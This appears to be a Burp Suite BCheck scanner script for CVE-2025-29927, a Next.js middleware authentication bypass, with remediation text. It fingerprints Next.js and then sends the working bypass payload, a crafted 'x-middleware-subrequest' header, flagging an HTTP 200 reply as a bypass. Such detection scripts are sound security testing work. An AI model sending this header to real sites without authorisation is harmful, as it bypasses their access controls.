metadata:
    language: v2-beta
    name: "CVE-2025-29927 Next.js Middleware Bypass Detection & Exploit"
    description: "Detects and attempts to bypass authentication in Next.js middleware."
    author: "Giriraj R (cipherlover)"
    tags: "CVE-2025-29927,Next.js,Nextjs,Bypass,Exploit"

define:
    issueRemediation = "Do not accept headers from users such as x-nextjs-data or x-middleware-subrequest."

given request then
    send request:
        headers:
            "x-nextjs-data": "1"

    if "x-nextjs-rewrite" in {latest.response.headers} then
        report issue:
            severity: medium
            confidence: firm
            detail: "Next.js detected at {latest.request.path}. The server responded with {latest.response.headers['x-nextjs-rewrite']} in x-nextjs-rewrite."
            remediation: {issueRemediation}

    else if "x-middleware-rewrite" in {latest.response.headers} then
        report issue:
            severity: medium
            confidence: firm
            detail: "Next.js detected at {latest.request.path}. The server responded with {latest.response.headers['x-middleware-rewrite']} in x-middleware-rewrite."
            remediation: {issueRemediation}

    else if "x-nextjs-redirect" in {latest.response.headers} then
        report issue:
            severity: medium
            confidence: firm
            detail: "Next.js detected at {latest.request.path}. The server responded with {latest.response.headers['x-nextjs-redirect']} in x-nextjs-redirect."
            remediation: {issueRemediation}
    end if

    send request:
        headers:
            "x-nextjs-data": "1"
    send request:
        headers:
            "x-middleware-subrequest": "src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware"

    if {latest.response.status_code} is "200" then
        report issue:
            severity: high
            confidence: firm
            detail: "Authentication bypass detected! The server responded with HTTP 200 after sending the bypass payload."
            remediation: {issueRemediation}
    end if

    send request:
        headers:
            "x-middleware-subrequest": "src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware"

    if {latest.response.status_code} is "200" then
        report issue:
            severity: high
            confidence: tentative
            detail: "Authentication bypass detected! The server responded with HTTP 200 after sending the bypass payload without x-nextjs-data."
            remediation: {issueRemediation}
    end if
